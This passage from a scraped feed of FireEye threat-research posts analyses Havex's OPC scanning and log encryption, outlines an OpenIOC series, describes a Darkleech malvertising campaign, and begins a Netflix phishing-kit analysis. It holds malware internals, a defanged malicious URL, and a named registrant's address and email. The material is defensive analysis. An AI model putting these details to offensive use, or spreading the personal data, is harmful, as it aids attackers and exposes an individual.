Relevant COM objects</b></p> \n <p>Once OPC servers are identified, the following CLSIDs are used to determine the capabilities of the OPC server:</p> \n <p> <a href=\"http://www.fireeye.com/content/dam/legacy/blog/2014/07/Screen-Shot-2014-07-17-at-12.33.22-PM.png\"><img width=\"554\" height=\"224\" class=\"alignnone  wp-image-6031 landscape-med\" alt=\"Screen Shot 2014-07-17 at 12.33.22 PM\" src=\"https://www.fireeye.com/content/dam/legacy/blog/2014/07/Screen-Shot-2014-07-17-at-12.33.22-PM.png\" /></a></p> \n <p style=\"text-align: center;\"> <b>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; Figure 6: CLSIDs used to determine capabilities of the OPC server</b></p> \n <p>When executing PE.dll, all of the OPC server data output is first saved as %TEMP%\\[random].tmp.dat. The results of a capability scan of an OPC server is stored in %TEMP%\\OPCServer[random].txt. Files are not encrypted or deleted once the scanning process is complete.</p> \n <p>Once the scanning completes, the log is deleted and the contents are encrypted and stored into a file named %TEMP%\\[random].tmp.yls.&nbsp; The encryption process uses an RSA public key obtained from the PE resource TYU.&nbsp; The RSA key is used to protect a randomly generated 168-bit 3DES key that is used to encrypt the contents of the log.</p> \n <p>The TYU resource is BZip2 compressed and XORed with the string “1312312”.&nbsp; A decoded configuration for 6BFC42F7CB1364EF0BFD749776AC6D38 is included in the figure below:</p> \n <p> <b> <a href=\"http://www.fireeye.com/content/dam/legacy/blog/2014/07/Screen-Shot-2014-07-17-at-12.27.24-PM.png\"><img width=\"601\" height=\"241\" class=\" wp-image-6029 alignleft landscape-med\" alt=\"Screen Shot 2014-07-17 at 12.27.24 PM\" src=\"https://www.fireeye.com/content/dam/legacy/blog/2014/07/Screen-Shot-2014-07-17-at-12.27.24-PM.png\" /></a></b></p> \n <p style=\"text-align: center;\"> <b>Figure 7: Sample decoded TYU resource</b></p> \n <p>The 4409de445240923e05c5fa6fb4204 value is believed to be an RSA key identifier. The AASp1… value is the Base64 encoded RSA key.</p> \n <p>A sample encrypted log file (%TEMP%\\[random].tmp.yls) is below.</p> \n <p>&nbsp;</p> \n <div class=\"blog-table-wrapper\"> \n  <p>&nbsp;</p> \n  <p>&nbsp;</p> \n  <p>&nbsp;</p> \n  <p>&nbsp;</p> \n  <p>&nbsp;</p> \n  <p>&nbsp;</p> \n  <p>&nbsp;</p> \n  <p>&nbsp;</p> \n  <p>&nbsp;</p> \n  <p>&nbsp;</p> \n  <p>&nbsp;</p> \n  <p>&nbsp;</p> \n  <table cellspacing=\"0\" cellpadding=\"0\" border=\"1\"> \n   <tbody> \n    <tr> \n     <td width=\"554\" valign=\"top\" style=\"text-align: center;\" colspan=\"2\">00000000&nbsp; 32 39 0a 66 00 66 00 30&nbsp; 00 30 00 66 00 66 00 30 29.f.f.0.0.f.f.000000010&nbsp; 00 30 00 66 00 66 00 30&nbsp; 00 30 00 66 00 66 00 30 .0.f.f.0.0.f.f.000000020&nbsp; 00 30 00 66 00 66 00 30&nbsp; 00 30 00 66 00 66 00 30 .0.f.f.0.0.f.f.000000030&nbsp; 00 30 00 66 00 66 00 30&nbsp; 00 30 00 66 00 37 39 36 .0.f.f.0.0.f.79600000040&nbsp; 0a 31 32 38 0a 96 26 cc&nbsp; 34 93 a5 4a 09 09 17 d3 .128..&amp;.4..J....00000050&nbsp; e0 bb 15 90 e8 5d cb 01&nbsp; c0 33 c1 a4 41 72 5f a5 .....]...3..Ar_.00000060&nbsp; 13 43 69 62 cf a3 80 e3&nbsp; 6f ce 2f 95 d1 38 0f f2 .Cib....o./..8..00000070&nbsp; 56 b1 f9 5e 1d e1 43 92&nbsp; 61 f8 60 1d 06 04 ad f9 V..^..C.a.`.....00000080&nbsp; 66 98 1f eb e9 4c d3 cb&nbsp; ee 4a 39 75 31 54 b8 02 f....L...J9u1T..00000090&nbsp; b5 b6 4a 3c e3 77 26 6d&nbsp; 93 b9 66 45 4a 44 f7 a2 ..J&lt;.w&amp;m..fEJD..000000A0&nbsp; 08 6a 22 89 b7 d3 72 d4&nbsp; 1f 8d b6 80 2b d2 99 5d .j\"...r.....+..]000000B0&nbsp; 61 87 c1 0c 47 27 6a 61&nbsp; fc c5 ee 41 a5 ae 89 c3 a...G'ja...A....000000C0&nbsp; 9e 00 54 b9 46 b8 88 72&nbsp; 94 a3 95 c8 8e 5d fe 23 ..T.F..r.....].#000000D0&nbsp; 2d fb 48 85 d5 31 c7 65&nbsp; f1 c4 47 75 6f 77 03 6b -.H..1.e..Guow.k</td> \n    </tr>\n   </tbody>\n  </table> \n </div> \n <p>&nbsp;</p> \n <p>--Truncated--Probable Key Identifierff00ff00ff00ff00ff00ff00ff00fRSA Encrypted 3DES Key5A EB 13 80 FE A6 B9 A9 8A 0F 41…The 3DES key will be the last 24 bytes of the decrypted result.3DES IV88 72&nbsp; 94 a3 95 c8 8e 5d3DES Encrypted Logfe 23 2d fb 48 85 d5 31 c7 65 f1…</p> \n <p style=\"text-align: center;\"> <b>Figure 8: Sample encrypted .yls file</b></p> \n <p> <b>Execution</b></p> \n <p>When executing PE.dll against the Arduino OPC server, we observe interesting responses within the plaintext %TEMP%\\[random].tmp.dat:</p> \n <p>&nbsp;</p> \n <div> \n  <p>&nbsp;</p> \n  <p style=\"text-align: left;\"> <a href=\"http://www.fireeye.com/content/dam/legacy/blog/2014/07/Screen-Shot-2014-07-17-at-12.41.27-PM.png\"><img width=\"508\" height=\"557\" class=\"alignnone  wp-image-6032 portrait-med\" alt=\"Screen Shot 2014-07-17 at 12.41.27 PM\" src=\"https://www.fireeye.com/content/dam/legacy/blog/2014/07/Screen-Shot-2014-07-17-at-12.41.27-PM.png\" /></a></p> \n  <p>&nbsp;</p> \n </div> \n <p>&nbsp;</p> \n <p style=\"text-align: center;\"> <b>Figure 9: Sample scan log</b></p> \n <p>The contents of the tmp.dat file are the results of the scan of the network devices, looking for OPC servers. These are not the in-depth results of the OPC servers themselves, and only perform the initial scanning.</p> \n <p>The particular Havex sample in question also enumerates OPC tags and fully interrogates the OPC servers identified within %TEMP%\\[random].tmp.dat. The particular fields queried are: server state, tag name, type, access, and id. The contents of a sample %TEMP%\\OPCServer[random].txt can be found below:</p> \n <p>&nbsp;</p> \n <div> \n  <p>&nbsp;</p> \n  <p style=\"text-align: left;\"> <a href=\"http://www.fireeye.com/content/dam/legacy/blog/2014/07/Screen-Shot-2014-07-17-at-12.43.48-PM.png\"><img width=\"514\" height=\"470\" class=\"alignnone  wp-image-6033 landscape-med\" alt=\"Screen Shot 2014-07-17 at 12.43.48 PM\" src=\"https://www.fireeye.com/content/dam/legacy/blog/2014/07/Screen-Shot-2014-07-17-at-12.43.48-PM.png\" /></a></p> \n  <p>&nbsp;</p> \n </div> \n <p>&nbsp;</p> \n <p style=\"text-align: center;\"> <b>Figure 10: Contents of OPCServer[Random].txt OPC interrogation</b></p> \n <p>While we don’t have a particular case study to prove the attacker’s next steps, it is likely after these files are created and saved, they will be exfiltrated to a command and control server for further processing.</p> \n <p> <b>Conclusion</b></p> \n <p>Part of threat intelligence requires understanding all parts of a particular threat. This is why we took a closer look at the OPC functionality of this particular Havex variant.&nbsp; We don’t have any case study showcasing why the OPC modules were included, and this is the first “in the wild” sample using OPC scanning. It is possible that these attackers could have used this malware as a testing ground for future utilization, however.</p> \n <p>Since ICS networks typically don’t have a high-level of visibility into the environment, there are several ways to help minimize some of the risks associated with a threat like Havex. First, ICS environments need to have the ability to perform full packet capture ability. This gives incident responders and engineers better visibility should an incident occur.</p> \n <p>Also, having mature incident processes for your ICS environment is important. Being able to have security engineers that also understand ICS environments during an incident is paramount. Finally, having trained professionals consistently perform security checks on ICS environments is helpful. This ensures standard sets of security protocols and best practices are followed within a highly secure environment.</p> \n <p>We hope that this information will further educate industrial control systems owners and the security community about how the OPC functionality of this threat works and serves as the foundation for more investigation. Still, lots of questions remain about this component of Havex. What is the attack path? Who is behind it? What is their intention? We’re continuing to track this specific threat and will provide further updates as this new tactic unfolds.</p> \n <p> <b>Acknowledgements</b></p> \n <p>We would like to thank Josh Homan for his help and support.</p> \n <p> <b>Related MD5s</b></p> \n <p>ba8da708b8784afd36c44bb5f1f436bc</p> \n <p>6bfc42f7cb1364ef0bfd749776ac6d38</p> \n <p>4102f370aaf46629575daffbd5a0b3c9</p> \n</div> \n<div> \n <b>References</b>\n</div> \n<div> \n <div> \n  <div> \n   <p> <a href=\"http://www.opcdatahub.com/WhatIsOPC.html\">http://www.matrikonopc.com/products/opc-desktop-tools/opc-explorer.aspx<br /> http://arduino.cc/en/Main/arduinoBoardUno<br /> http://www.f-secure.com/weblog/archives/00002718.html<br /> http://www.opcdatahub.com/WhatIsOPC.html</a></p> \n  </div> \n </div> \n</div>","descriptionType":"html","publishedDate":"Thu, 17 Jul 2014 14:00:00 +0000","feedId":1226,"bgimg":"https://www.fireeye.com/content/dam/legacy/blog/2014/07/havex1.png","linkMd5":"35f63f48f41b28cfeea2d095e218ea2f","bgimgJsdelivr":"https://cdn.jsdelivr.net/gh/myreaderx8/cdn75@2020_2/2020/08/24/14-11-06-113_b6a429348ed116de.webp","destWidth":655,"destHeight":261,"sourceBytes":52471,"destBytes":15644,"author":"Kyle Wilhoit","articleImgCdnMap":{"https://www.fireeye.com/content/dam/legacy/blog/2014/07/havex1.png":"https://cdn.jsdelivr.net/gh/myreaderx8/cdn75@2020_2/2020/08/24/14-11-06-113_b6a429348ed116de.webp","https://www.fireeye.com/content/dam/legacy/blog/2014/07/havex2.png":"https://cdn.jsdelivr.net/gh/myreaderx33/cdn43@2020_1/2020/08/24/14-11-11-122_2f6d84b7e97be1cf.webp","https://www.fireeye.com/content/dam/legacy/blog/2014/07/havex3.png":"https://cdn.jsdelivr.net/gh/myreaderx/cdn59@2020_6/2020/08/24/14-11-14-453_f229ef86c18f3965.webp","https://www.fireeye.com/content/dam/legacy/blog/2014/07/havex4.png":"https://cdn.jsdelivr.net/gh/myreaderx33/cdn69@2020_3/2020/08/24/14-11-13-384_8465834a36c24630.webp","https://www.fireeye.com/content/dam/legacy/blog/2014/07/Screen-Shot-2014-07-17-at-12.31.56-PM.png":"https://cdn.jsdelivr.net/gh/myreaderx23/cdn63@2020_6/2020/08/24/14-11-10-931_4fe978afef860ab4.webp","https://www.fireeye.com/content/dam/legacy/blog/2014/07/Screen-Shot-2014-07-17-at-12.33.22-PM.png":"https://cdn.jsdelivr.net/gh/myreaderx13/cdn20@2020_2/2020/08/24/14-11-19-871_df4e8f8dabc3985a.webp","https://www.fireeye.com/content/dam/legacy/blog/2014/07/Screen-Shot-2014-07-17-at-12.27.24-PM.png":"https://cdn.jsdelivr.net/gh/myreaderx5oss/cdn13@2020_2/2020/08/24/14-11-12-856_f4ac72baeacf1caf.webp","https://www.fireeye.com/content/dam/legacy/blog/2014/07/Screen-Shot-2014-07-17-at-12.41.27-PM.png":"https://cdn.jsdelivr.net/gh/myreaderx25/cdn84@2020_3/2020/08/24/14-11-18-106_8395dbb5e1cd3040.webp","https://www.fireeye.com/content/dam/legacy/blog/2014/07/Screen-Shot-2014-07-17-at-12.43.48-PM.png":"https://cdn.jsdelivr.net/gh/myreaderx15/cdn24@2020_6/2020/08/24/14-11-24-662_e49379a98de63f20.webp"},"publishedOrCreatedDate":1598278264206},{"createdTime":"2020-08-24 22:11:04","updatedTime":"2020-08-24 22:11:04","title":"Back to Basics Series: OpenIOC","link":"http://www.fireeye.com/blog/threat-research/2013/09/basics-series-openioc.html","description":"<div class=\"c00 c00v1\"> \n <p>Over the next few months, a few of my colleagues and I will be touching on various topics related to Mandiant and computer security. As part of this series, we are going to be talking about <a target=\"_blank\" href=\"http://www.openioc.org/\">OpenIOC</a> - how we got where we are today, how to make and use IOCs, and the future of OpenIOC. This topic can't be rolled into a single blog post, so we have developed a brief syllabus to outline the topics that we will be covering in the near future.</p> \n <p> <b> <a target=\"_blank\" href=\"https://www.mandiant.com/blog/history-openioc/\">The History of OpenIOC</a></b></p> \n <p>In this post we're going to focus on the past state of threat intelligence sharing and how it has evolved up to this point in the industry. We'll specifically focus on how we implemented OpenIOC at Mandiant as a way to codify threat intelligence.</p> \n <p> <b> <a target=\"_blank\" href=\"https://www.mandiant.com/blog/openioc-basics/\">Back to the Basics</a></b></p> \n <p>What are indicators of compromise? What is an OpenIOC? What goes into an IOC? How do you read these things? What can you include in them? We will address all of these questions and more.</p> \n <p> <b>Investigating with Indicators of Compromise (IOCs)</b></p> \n <p>In this post, we will model an actual incident response and walk through the creation of IOCs to detect malware (and attacker activity) related to the incident presented. Multiple blog posts and IOCs will come out of this exercise.</p> \n <p> <b>IOCs at Scale</b></p> \n <p>So far, we will have touched on using <a target=\"_blank\" href=\"http://www.fireeye.com/content/fireeye-www/en_US/services/freeware/redline.html\">Redline™</a> to deploy OpenIOC when investigating a single host. To deploy IOCs across an enterprise, we use <a target=\"_blank\" href=\"https://www.mandiant.com/products/mandiant-platform/intelligent-response\">Mandiant for Intelligent Response® (MIR</a><a target=\"_blank\" href=\"https://www.mandiant.com/products/mandiant-platform/intelligent-response\">®</a>). Briefly, we will show how we can use MIR to deploy the IOCs built in the previous exercise across an enterprise scenario, expediting the incident response process.</p> \n <p> <b>The Future of OpenIOC</b></p> \n <p>What is next? OpenIOC was open sourced in the fall of 2011, and it is time for an upgrade! With the soft-launch of the draft OpenIOC 1.1 spec at Black Hat USA, we've since released a draft of the OpenIOC 1.1 schema. We'll discuss what we changed and why, as well as some of the exciting possibilities that this update makes possible.</p> \n <p> <b>Integrating OpenIOC 1.1 into tools</b></p> \n <p>With the release of the OpenIOC 1.1 draft, we also released a tool,<a target=\"_blank\" href=\"https://github.com/mandiant/ioc_writer\"> ioc writer</a>, which can be used to create or modify OpenIOC 1.1 IOCs. We will detail the capabilities of this library and how you could use it to add OpenIOC support to your own applications. We will also discuss the potential for using parameters to further define application behavior that is not built into the OpenIOC schema itself.</p> \n <p>We have several goals for this series:</p> \n <ul> \n  <li>Introduce OpenIOC for people that are not already familiar with OpenIOC</li> \n  <li>Show how you can use OpenIOC to record artifacts identified during an investigation</li> \n  <li>Show how OpenIOC can be deployed to investigate a single host - or a whole enterprise</li> \n  <li>Discuss the future of OpenIOC &amp; the upcoming specification, OpenIOC 1.1</li> \n  <li>Show how OpenIOC 1.1 support can be added to tools, and future capabilities of the standard</li> \n </ul> \n <p>Stay tuned for our next post in the series!</p> \n</div>","descriptionType":"html","publishedDate":"Thu, 12 Sep 2013 19:33:56 +0000","feedId":1226,"bgimg":"","linkMd5":"36eea057207ca76534314452f74bdcae","bgimgJsdelivr":"","metaImg":"","author":"Will Gibb","publishedOrCreatedDate":1598278264207},{"createdTime":"2020-08-24 22:11:04","updatedTime":"2020-08-24 22:11:04","title":"Another Darkleech Campaign","link":"http://www.fireeye.com/blog/threat-research/2013/10/another-darkleech-campaign.html","description":"<p>Last week got us up close and personal with Darkleech and Blackhole with our <i>external</i> careers web site.</p> \n<p>The fun didn’t end there, this week we saw a tidal wave of Darkleech activity linked to a large-scale <a href=\"http://en.wikipedia.org/wiki/Malvertising\">malvertising</a> campaign identified by the following URL:</p> \n<p>hXXp://delivery[.]globalcdnnode[.]com/7f01baa99716452bda5bba0572c58be9/afr-zone.php</p> \n<p>Again Darkleech was up to its tricks, injecting URLs and sending victims to a landing page belonging to the Blackhole Exploit Kit, one of the most popular and effective exploit kits available today. Blackhole wreaks havoc on computers by exploiting vulnerabilities in client applications like IE, Java and Adobe, computers that are vulnerable to exploits launched by Blackhole are likely to become infected with one of several flavors of malware including <a href=\"http://www.fireeye.com/content/fireeye-www/en_US/products/ransomware.html\">ransomware</a>, Zeus/Zbot variants and <a href=\"http://en.wikipedia.org/wiki/Click_fraud\">clickfraud</a> trojans like ZeroAccess.</p> \n<p>We started logging hits at 21:31:00 UTC on Sunday 09/22/2013, the campaign has been ongoing, peaking Monday and tapered down through out the week.</p> \n<p>During most of the campaign’s run, <i>delivery[.]globalcdnnode[.]com</i> appeared to have gone dark, no longer serving the exploit kit’s landing page as expected and then stopped resolving altogether, yet tons of requests kept flowing.</p> \n<p>This left some scratching their heads as to whether the noise was a real threat.</p> \n<p>Indeed, <i>it was a real threat,</i> as Blackhole showed up to the party a couple of days later; this was confirmed by actually witnessing a system get attacked on a subsequent visit to the URL.</p> \n<p>&nbsp;</p> \n<p> <a href=\"http://www.fireeye.com/content/dam/legacy/blog/2013/10/globalcdn_BHEK.png\"><img class=\"alignnone size-full wp-image-3425 landscape-lg\" alt=\"globalcdn_BHEK\" src=\"https://www.fireeye.com/content/dam/legacy/blog/2013/10/globalcdn_BHEK.png\" width=\"912\" height=\"401\" /></a></p> \n<p> <b>Figure 1. – Session demonstrating exploit via IE browser and Java.</b></p> \n<p>&nbsp;</p> \n<p>The server returned the (obfuscated) Blackhole Landing page; no 404 this time.</p> \n<p> <a href=\"http://www.fireeye.com/content/dam/legacy/blog/2013/10/Darkleech_LANDING.png\"><img class=\"alignnone size-full wp-image-3428 landscape-med\" alt=\"Darkleech_LANDING\" src=\"https://www.fireeye.com/content/dam/legacy/blog/2013/10/Darkleech_LANDING.png\" width=\"705\" height=\"390\" /></a></p> \n<p> <b>Figure 2 – request and response to to delivery[.]globalcdnnode[.]com.</b></p> \n<p>&nbsp;</p> \n<p>The next stage was to load a new URL for the malicious jar file. At this point, the unpatched Windows XP system running vulnerable Java quickly succumbed to <a href=\"http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2013-0422\">CVE-2013-0422</a>.</p> \n<p> <a href=\"http://www.fireeye.com/content/dam/legacy/blog/2013/10/Darkleech_JAVA.png\"><img class=\"alignnone size-full wp-image-3427 landscape-lg\" alt=\"Darkleech_JAVA\" src=\"https://www.fireeye.com/content/dam/legacy/blog/2013/10/Darkleech_JAVA.png\" width=\"939\" height=\"321\" /></a></p> \n<p> <b>Figure 3 – Packet capture showing JAR file being downloaded.</b></p> \n<p> <a href=\"http://www.fireeye.com/content/dam/legacy/blog/2013/10/Darkleech_Java_Classes.png\"><img class=\"alignnone size-full wp-image-3424 portrait-sm\" alt=\"Darkleech_Java_Classes\" src=\"https://www.fireeye.com/content/dam/legacy/blog/2013/10/Darkleech_Java_Classes.png\" width=\"296\" height=\"335\" /></a></p> \n<p> <b>Figure 4. – Some of the Java class files visible in the downloaded Jar.</b></p> \n<p>&nbsp;</p> \n<p>Even though our system was exploited and the browser was left in a hung state, it did not receive the payload. Given the sporadic availability during the week of both the host and exploit kit’s landing page, it’s possible the system is or was undergoing further setup and this is the <i>prelude</i> to yet another large-scale campaign.</p> \n<p>We can’t say for sure but we know this is not the last time we will see it or the crimeware actor behind it.</p> \n<p>Registrant:</p> \n<p>Name: Alexey Prokopenko<br /> Organization: home<br /> Address: Lenina 4, kv 1<br /> City: Ubileine<br /> Province/state: LUGANSKA OBL<br /> Country: UA<br /> Postal Code: 519000<br /> Email: alex1978a @bigmir.net</p> \n<p>By the way, this <a href=\"https://www.google.com/#q=alex1978a%40bigmir.net\">actor</a> has a long <a href=\"http://www.malwaredomainlist.com/mdl.php?search=alex1978a%40bigmir.net&amp;colsearch=Registrant&amp;quantity=200&amp;inactive=on\">history</a> of malicious activity online too.</p> \n<p>The campaign also appears to be abusing Amazon Web Services.</p> \n<p>globalcdnnode.com<br /> Server:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ns-293.awsdns-36.com<br /> Address:&nbsp;&nbsp;&nbsp; 205.251.193.37#53</p> \n<p>globalcdnnode.com<br /> origin = ns-293.awsdns-36.com<br /> mail addr = awsdns-hostmaster.amazon.com</p> \n<p>At time of this writing, the domain delivery[.]globalcdnnode[.]com was still resolving, using <a href=\"http://www.honeynet.org/papers/ff/\">fast-flux</a> DNS techniques to resolve to a different IP address every couple minutes, thwarting attempts at shutting down the domain by constantly being on the move.</p> \n<p> <a href=\"http://www.fireeye.com/content/dam/legacy/blog/2013/10/GlobalCDN_PLESK.png\"><img class=\"alignnone size-full wp-image-3426 landscape-lg\" alt=\"GlobalCDN_PLESK\" src=\"https://www.fireeye.com/content/dam/legacy/blog/2013/10/GlobalCDN_PLESK.png\" width=\"806\" height=\"261\" /></a></p> \n<p> <b>Figure 5. – The familiar Plesk control panel, residing on the server.</b></p> \n<p>This was a widespread campaign, indirectly affecting many web sites via malvertising techniques. The referring hosts run the gamut from local radio stations to high profile news, sports, and shopping sites. Given the large amounts of web traffic these types of sites see, its not surprising there was a tidal wave of requests to delivery[.]globalcdnnode[.]com. Every time a page with the malvertisement was loaded, a request was made to hXXp://delivery.globalcdnnode.com/7f01baa99716452bda5bba0572c58be9/afr-zone.php, in the background.</p> \n<p>To give an example of what this activity looked like from DTI, you can see the numbers in the chart below.</p> \n<p>&nbsp;</p> \n<p> <a href=\"http://www.fireeye.com/content/dam/legacy/blog/2013/10/Darkleech_splunk.png\"><img class=\"alignnone size-full wp-image-3423 landscape-sm\" alt=\"Darkleech_splunk\" src=\"https://www.fireeye.com/content/dam/legacy/blog/2013/10/Darkleech_splunk.png\" width=\"464\" height=\"150\" /></a></p> \n<p> <b>Figure 6. – DTI graph showing number of Darkleech detections logged each day.</b></p> \n<p>By using malvertising and or posing as a legitimate advertiser or content delivery network, the bad guys infiltrate the web advertisement ecosystem. This results in their malicious content getting loaded in your browser, <i>often times in the background</i>, while you browse sites that have nothing to do with the attack (as was the case in our careers site).</p> \n<p>Imagine a scenario where a good portion of enterprise users have a home page set to <i>a popular news website</i>. More than likely, the main web page has advertisements, and some of those ads could be served from 3<sup>rd</sup> party advertiser networks and or CDNs. If <i>just</i> one of those advertisements on the page is malicious, visitors to that page are <i>at risk</i> of redirection and or infection, even though the news website’s server is itself clean.</p> \n<p>So, when everybody shows up to work on Monday and opens their browsers, there could be a wave of clients making requests to exploit kit landing pages, if Darkleech is lurking in those advertisement waters, you could end up with a leech or 2 attached to your network.</p>","descriptionType":"html","publishedDate":"Thu, 03 Oct 2013 17:23:00 +0000","feedId":1226,"bgimg":"https://www.fireeye.com/content/dam/legacy/blog/2013/10/globalcdn_BHEK.png","linkMd5":"1c03952058e21f3ba555a5a240ad0390","bgimgJsdelivr":"https://cdn.jsdelivr.net/gh/myreaderx24/cdn36@2020_4/2020/08/24/14-11-04-923_1d00b4c26a1eae4c.webp","destWidth":912,"destHeight":401,"sourceBytes":66287,"destBytes":68870,"author":"J. Gomez","articleImgCdnMap":{"https://www.fireeye.com/content/dam/legacy/blog/2013/10/globalcdn_BHEK.png":"https://cdn.jsdelivr.net/gh/myreaderx24/cdn36@2020_4/2020/08/24/14-11-04-923_1d00b4c26a1eae4c.webp","https://www.fireeye.com/content/dam/legacy/blog/2013/10/Darkleech_LANDING.png":"https://cdn.jsdelivr.net/gh/myreaderx32/cdn67@2020_6/2020/08/24/14-11-12-092_41f0f835fa7dd67d.webp","https://www.fireeye.com/content/dam/legacy/blog/2013/10/Darkleech_JAVA.png":"https://cdn.jsdelivr.net/gh/myreaderx4/cdn47@2020_4/2020/08/24/14-11-08-784_4e688302a5c4b1f4.webp","https://www.fireeye.com/content/dam/legacy/blog/2013/10/Darkleech_Java_Classes.png":"https://cdn.jsdelivr.net/gh/myreaderx1/cdn99@2020_1/2020/08/24/14-11-10-499_acc7be31ffb42664.webp","https://www.fireeye.com/content/dam/legacy/blog/2013/10/GlobalCDN_PLESK.png":"https://cdn.jsdelivr.net/gh/myreaderx3/cdn62@2020_3/2020/08/24/14-11-15-585_de7fdf6901896a91.webp","https://www.fireeye.com/content/dam/legacy/blog/2013/10/Darkleech_splunk.png":"https://cdn.jsdelivr.net/gh/myreaderx1/cdn7@2020_5/2020/08/24/14-11-11-645_0ffcc3af6617209e.jpg"},"publishedOrCreatedDate":1598278264206},{"createdTime":"2020-08-24 22:11:04","updatedTime":"2020-08-24 22:11:04","title":"Credit Card Data and Other Information Targeted in Netflix Phishing Campaign","link":"http://www.fireeye.com/blog/threat-research/2017/01/credit_card_dataand.html","description":"<h5>Introduction</h5> \n<p>Through FireEye’s <a href=\"http://www.fireeye.com/content/fireeye-www/en_US/products/email-security.html\" target=\"_blank\">Email Threat Prevention</a> (ETP) solution, FireEye Labs discovered a phishing campaign in the wild targeting the credit card data and other personal information of Netflix users primarily based in the United States.</p> \n<p>This campaign is interesting because of the evasion techniques that were used by the attackers:</p> \n<ul> \n <li>The phishing pages were hosted on legitimate, but compromised web servers.</li> \n <li>Client-side HTML code was obfuscated with AES encryption to evade text-based detection.</li> \n <li>Phishing pages were not displayed to users from certain IP addresses if its DNS resolved to companies such as Google or PhishTank.</li> \n</ul> \n<p>At the time of posting, the phishing websites we observed were no longer active.</p> \n<h5>Attack Flow</h5> \n<p>The attack seems to start with an email notification – sent by the attackers – that asks the user to update their Netflix membership details. The phishing link inside the email body directs recipients to a page that attempts to mimic a Netflix login page, as seen in Figure 1.</p> \n<p> <img src=\"https://www.fireeye.com/content/dam/fireeye-www/blog/images/Credit%20card%20data%20Netflix%20Mohammed%20Dalla/Fig1.png\" /></p> \n<p> <span class=\"type-XS\">Figure 1: Fake login page mimicking the Netflix website</span></p> \n<p>Upon submitting their credentials, victims are then directed to webpages requesting additional membership details (Figure 2) and payment information (Figure 3). These websites also attempt to mimic authentic Netflix webpages and appear legitimate. Once the user has entered their information, they are taken to the legitimate Netflix homepage.</p> \n<p> <img src=\"https://www.fireeye.com/content/dam/fireeye-www/blog/images/Credit%20card%20data%20Netflix%20Mohammed%20Dalla/Fig2.png\" /></p> \n<p> <span class=\"type-XS\">Figure 2: Fake webpage asking users to update their personal details</span></p> \n<p> <img src=\"https://www.fireeye.com/content/dam/fireeye-www/blog/images/Credit%20card%20data%20Netflix%20Mohammed%20Dalla/Fig3.png\" /></p> \n<p> <span class=\"type-XS\">Figure 3: Netflix phishing webpage used to steal credit card information</span></p> \n<h5>Technical Details</h5> \n<p>The phishing kit uses techniques to evade phishing filters. One technique is the use of AES encryption to encode the content presented at the client’s side, as seen in Figure 4. The purpose of using this technique is code obfuscation, which helps to evade text-based detection. By obfuscating the webpage, attackers try to deceive text-based classifiers and prevent them from inspecting webpage content. This technique employs two files, a PHP and a JavaScript file that have functions to encrypt and decrypt input strings. The PHP file is used to encrypt the webpages at the server side, as seen in Figure 5. At the client side, the encrypted content is decoded using a defined function in the JavaScript file, as seen in Figure 6. Finally, the webpage is rendered using the ‘document.write’ function.<img src=\"https://www.fireeye.com/content/dam/fireeye-www/blog/images/Credit%20card%20data%20Netflix%20Mohammed%20Dalla/Fig4.png\" /></p> \n<p> <span class=\"type-XS\">Figure 4: Client-side code obfuscation using AES encryption</span></p> \n<p> <img src=\"https://www.fireeye.com/content/dam/fireeye-www/blog/images/Credit%20card%20data%20Netflix%20Mohammed%20Dalla/Fig5.png\" /></p> \n<p> <span class=\"type-XS\">Figure 5: PHP code used at server side for encryption</span></p> \n<p> <i> <img src=\"https://www.fireeye.com/content/dam/fireeye-www/blog/images/Credit%20card%20data%20Netflix%20Mohammed%20Dalla/Fig6.png\" /></i></p> \n<p> <span class=\"type-XS\">Figure 6: JavaScript code used at client-side for decryption</span></p> \n<p>Another technique is the host-based evasion, as seen in Figure 7. The host name of organizations such as ‘phishtank’ and ‘google’ are blacklisted. The host name of the client is compared against a list of blacklisted host names. If there is a match against the blacklist, a “404 Not Found” error page is presented.</p> \n<p> <a href=\"http://www.fireeye.com/content/dam/fireeye-www/blog/images/Credit%20card%20data%20Netflix%20Mohammed%20Dalla/Fig7.png\" target=\"_blank\"><img src=\"https://www.fireeye.com/content/dam/fireeye-www/blog/images/Credit%20card%20data%20Netflix%20Mohammed%20Dalla/Fig7.png\" /></a></p> \n<p> <span class=\"type-XS\">Figure 7: Server side code for blacklisting known hosts. Click image to enlarge.</span></p> \n<p>As with the majority of phishing attacks, this campaign uses PHP mail utility to send the attacker the stolen credentials. The advantage of using this technique is that the attacker can host their phishing kits on a number of websites and still get the stolen credentials and other information from a single email account. This enables attackers to extend their reach.</p> \n<p> <a href=\"http://www.fireeye.com/content/dam/fireeye-www/blog/images/Credit%20card%20data%20Netflix%20Mohammed%20Dalla/Fig8a.png\" target=\"_blank\"><img src=\"https://www.fireeye.com/content/dam/fireeye-www/blog/images/Credit%20card%20data%20Netflix%20Mohammed%20Dalla/Fig8a.png\" /></a></p> \n<p> <img src=\"https://www.fireeye.com/content/dam/fireeye-www/blog/images/Credit%20card%20data%20Netflix%20Mohammed%20Dalla/Fig8b.png\" /></p> \n<p> <span class=\"type-XS\">Figure 8: Stolen information is sent to an email address using mail() function</span></p> \n<h5>Tips to Secure your Netflix Account</h5> \n<p>To learn more about securing your Netflix account, Netflix provides additional information on how to keep your account safe from phishing scams and other fraudulent activity at https://www.netflix.com/security.</p>","descriptionType":"html","publishedDate":"Mon, 09 Jan 2017 16:00:00 +0000","feedId":1226,"bgimg":"https://www.fireeye.com/content/dam/fireeye-www/blog/images/Credit%20card%20data%20Netflix%20Mohammed%20Dalla/Fig1.png","linkMd5":"a043c551898431bc17c8ca253e469625","bgimgJsdelivr":"https://cdn.jsdelivr.net/gh/myreaderx22/cdn36@2020_1/2020/08/24/14-11-06-919_f310539e6642ba82.webp","destWidth":1200,"destHeight":679,"sourceBytes":745888,"destBytes":93086,"author":"Mohammed Mohsin 